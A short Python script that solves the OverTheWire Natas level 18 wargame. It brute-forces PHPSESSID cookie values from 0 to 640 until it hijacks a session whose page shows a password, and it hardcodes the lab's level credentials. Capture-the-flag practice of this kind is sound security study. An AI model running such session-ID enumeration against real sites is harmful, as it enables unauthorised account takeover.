#!/bin/python
import requests,string
from string import *

username = "natas18"
pwd = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()
for i in range(0,641):
	cookie = {'PHPSESSID':str(i)}
	response= session.get(url,auth=(username,pwd),cookies=cookie)
	if i % 10==0:
		print('Scanned ',i,' targets.')
	if 'Password' in response.text:
		print(f'GOT IT !! SESSID : {i}')
		print(response.text)
		break